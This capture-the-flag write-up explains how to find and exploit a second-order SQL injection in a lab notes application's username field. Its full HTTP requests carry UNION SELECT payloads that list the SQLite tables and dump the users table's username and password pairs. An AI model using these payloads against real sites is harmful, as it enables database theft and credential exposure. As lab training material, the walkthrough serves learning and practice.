# Challenge 9 - Vulnerable Startup: Vulnerable Notes

> Here, the previous vulnerabilities have been fixed, and the login form is no longer vulnerable to SQL injection. The team has added a new note function, allowing users to add notes on their page. The goal of this challenge is to find the vulnerability and dump the database to find the flag.

The login form is no longer vulnerable to SQL injection, so create an account to analyze the notes functionality of the application. Save the registration request in BurpSuite Repeater, just in case it is needed later.

```http
POST /challenge4/signup HTTP/1.1
Host: 10.10.223.194:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://10.10.223.194:5000
DNT: 1
Connection: close
Referer: http://10.10.223.194:5000/challenge4/signup
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=tgihf&password=pass
```

Navigate to the notes functionality, `/challenge4/notes`. 

![Pasted image 20210806083321](Pasted%20image%2020210806083321.png)

The username is rendered in both the application's persistent header and in a banner above the input box. There are input boxes for `title` and `note`. The `Insert` button presumably triggers the server to process the input and execute a SQL statement something like the following:

```sql
INSERT INTO $NOTES_TABLE (username, title, note) VALUES ('$USERNAME', '$TITLE', '$NOTES')
```

If this is the case, then one of the following three injections will cause the application to fail to insert a record: a username of `'`, a title of `'`, or a note of `'`.

```http
POST /challenge4/notes HTTP/1.1
Host: 10.10.223.194:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Origin: http://10.10.223.194:5000
DNT: 1
Connection: close
Referer: http://10.10.223.194:5000/challenge4/notes
Cookie: session=.eJyrVkrOSMzJSc1LTzWJLy1OLYrPTFGyMtdBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHX4blQ.YQ0rrw.AysVjEpc-UQfUm2Rgz3aX_99TRI
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

title=%27&note=blah
```

```http
POST /challenge4/notes HTTP/1.1
Host: 10.10.223.194:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Origin: http://10.10.223.194:5000
DNT: 1
Connection: close
Referer: http://10.10.223.194:5000/challenge4/notes
Cookie: session=.eJyrVkrOSMzJSc1LTzWJLy1OLYrPTFGyMtdBF85LzE1VslIqSc_MSFPSUcpNzMxLLCiILyxNLapUskpLzClOrQUAHX4blQ.YQ0rrw.AysVjEpc-UQfUm2Rgz3aX_99TRI
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

title=blah&note=%27
```

Both a title of `'` and a note of `'` cause the note to be successfully added to the database and rendered on the `/challenge4/notes` page below the input area. However, a username of `'` causes no note to be added to the database, no matter what its title and note are. This indicates that the `INSERT` query might look something like this:

```sql
INSERT INTO $NOTES_TABLE VALUES (username, title, note) VALUES ('$USERNAME', ?, ?) -- $TITLE and $NOTE into the prepared statement
```

This indicates that the `username` parameter could be vulnerable to SQL injection. This vulnerability could allow one to add arbitrary notes into the database under arbitrary users. If stacked queries are allowed, it may also be a vector towards achieving the goal of dumping the database and finding the flag. This requires a user to be created with the following username: `tgihf', ?, ?); sqlite3_sleep(10000)--`. Submitting a note under this username doesn't cause the application to suspend execution, indicating that either the `INSERT` is happening asynchronously or, more likely, stacked queries aren't allowed.

`/challenge4/notes` also iteratively renders each note that is associated with the currently logged in user beneath the input box. The SQL query that fetches those notes is probably something like the following:

```sql
SELECT title, note FROM $NOTES_TABLE WHERE username = '$USERNAME'
```

This indicates that it may be possible to inject a `UNION SELECT` clause into the username parameter to have arbitrary SQL query output rendered on the `/challenge4/notes` page. This vulnerability may have already been inadvertently confirmed, actually. It was noted above that the `username` parameter in the `INSERT` statement was likely vulnerable to SQL injection because a username of `'` prevented any notes from being added to the database. Actually, it is more likely that the `INSERT` statement consitently used parameterized arguments and thus, the note was being added to the database, but the vulnerable `SELECT` statement was failing to retrieve any notes because the username of `'` was causing it to error out.

Determine how many columns are being fetched in the original `SELECT` statement by injecting incremental `ORDER BY` statements into the username parameter. This requires creating a new user account for every injection.

```sql
SELECT $COLUMNS FROM $NOTES_TABLE WHERE username = 'tgihf' ORDER BY 1--'
```

This injection causes the notes of `tgihf` to be rendered on `/challenge4/notes`. This indicates that there is at least one column in the resultant row set.

```sql
SELECT $COLUMNS FROM $NOTES_TABLE WHERE username = 'tgihf' ORDER BY 2--'
```

This injection causes the same result as `ORDER BY 1`. This indicates that there is at least two columns in the resultant row set.

```sql
SELECT $COLUMNS FROM $NOTES_TABLE WHERE username = 'tgihf' ORDER BY 3--'
```

This injection causes no notes to be rendered on `/challenge4/notes`. This indicates that, just as was originally assumed, there are indeed two columns in the resultant row set: presumably, `title` and `note`. These are both probably of type VARCHAR, unless they are foreign key integer IDs to `titles` and `notes` tables. Verify that they are of type string. The following query should render all of user `tgihf`'s notes, along with a note of title `a` and body `b`.

```sql
SELECT $COLUMNS FROM $NOTES_TABLE WHERE username = 'tgihf' UNION SELECT 'a','b'--'
```

It worked!

![Pasted image 20210806091328](Pasted%20image%2020210806091328.png)

This confirms that we can inject into the username and retrieve query output. Determine the backend database type.

```http
POST /challenge4/signup HTTP/1.1
Host: 10.10.223.194:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: http://10.10.223.194:5000
DNT: 1
Connection: close
Referer: http://10.10.223.194:5000/challenge4/signup
Cookie: session=eyJtYWluYXBwX3F1ZXJ5IjpmYWxzZX0.YQ0v6g.qh-mXSAfN1fNPh022bWlNfHkV3c
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=tgihf'+UNION+SELECT+'SQLite%20Version',sqlite_version()--&password=pass
```

```http
GET /challenge4/notes HTTP/1.1
Host: 10.10.223.194:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.223.194:5000/challenge4/home
DNT: 1
Connection: close
Cookie: session=.eJyrVkrOSMzJSc1LTzWJLy1OLYrPTFGyMjTRQRfPS8xNVbJSKknPzEhTVyjNy8zPUyhOzUlNLlFQLy7MySxJVShLVaoFAIQ5HHc.YQ02ug.v71P-Y5AEoup2Y-0lMvB62gfOP4
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```

![Pasted image 20210806092047](Pasted%20image%2020210806092047.png)

The target database is SQLite 3.22.0.

Since the goal is to dump a database for the flag, dump all non-SQLite system tables.

```http
POST /challenge4/signup HTTP/1.1
Host: 10.10.223.194:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 125
Origin: http://10.10.223.194:5000
DNT: 1
Connection: close
Referer: http://10.10.223.194:5000/challenge4/signup
Cookie: session=eyJtYWluYXBwX3F1ZXJ5IjpmYWxzZX0.YQ0v6g.qh-mXSAfN1fNPh022bWlNfHkV3c
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=tgihf'+UNION+SELECT+'Tables',name+FROM+sqlite_master+WHERE+type='table'+AND+name+NOT+LIKE+'sqlite_%'--&password=pass
```

```http
GET /challenge4/notes HTTP/1.1
Host: 10.10.223.194:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.223.194:5000/challenge4/home
DNT: 1
Connection: close
Cookie: session=.eJxdyDEOgCAMBdCrkC4sLCa6cBlS8YsktaLAYIx3d_eN76G4sQg0YQy94gp5IT9M7v_KO8hTS3lbremaDzUVgtiMbTwLqnVKjnbOyqWEs-O6ya8sFe8HRoskVw.YQ04Jg.u9KW6G9V8uKh3TnV7qMZ36eDMJE
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```

![Pasted image 20210806092534](Pasted%20image%2020210806092534.png)

There are two tables: `notes` and `users`. Dump `users` first to see if it has the flag. First, understand its structure by dumping the `CREATE TABLE` statement used to create it.

```http
POST /challenge4/signup HTTP/1.1
Host: 10.10.223.194:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 125
Origin: http://10.10.223.194:5000
DNT: 1
Connection: close
Referer: http://10.10.223.194:5000/challenge4/signup
Cookie: session=eyJtYWluYXBwX3F1ZXJ5IjpmYWxzZX0.YQ0v6g.qh-mXSAfN1fNPh022bWlNfHkV3c
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=tgihf'+UNION+SELECT+'CREATE%20Statement',sql+FROM+sqlite_master+WHERE+type='table'+AND+name='users'--&password=pass
```

```http
GET /challenge4/notes HTTP/1.1
Host: 10.10.223.194:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: session=.eJxdyDsOgCAQBcCrkG1oaEyMBZchG3wICazIpzDGu9s75TzkI-cMObC62dFc2skum_m_cAFZGkeKQasp6RTVkeGH0r6BB1QfZKhwEq7VXRPtJhs4d7wfTRYklw.YQ05Qw.AWP2BhNY5RAOADCqIoaoOTXjvLI
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
```

The following `CREATE` statement was used to create the `users` table:

```sql
CREATE TABLE users ( id integer primary key, username text unique not null, password text not null )
```

Dump the `users` table.

```http
POST /challenge4/signup HTTP/1.1
Host: 10.10.223.194:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Origin: http://10.10.223.194:5000
DNT: 1
Connection: close
Referer: http://10.10.223.194:5000/challenge4/signup
Cookie: session=eyJtYWluYXBwX3F1ZXJ5IjpmYWxzZX0.YQ0v6g.qh-mXSAfN1fNPh022bWlNfHkV3c
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=tgihf'+UNION+SELECT+'creds',username||':'||password+FROM+users--&password=pass
```

```http
GET /challenge4/notes HTTP/1.1
Host: 10.10.223.194:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.223.194:5000/challenge4/home
DNT: 1
Connection: close
Cookie: session=.eJxdyEEKgCAQBdCryGzcuAmCwMvIoL8UbCpHFxHdvX1v-R6KmWuFbJjDULRQEvlpcf8X3kGe-lbyas2QcohRVMRubGxIat1QcrRzET7PcA20m_zKVfF-SDkkaQ.YQ054Q.38BFd_dpdvIfIMVd4yebAv2GDBg
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
```

The flag is in the final row of the table.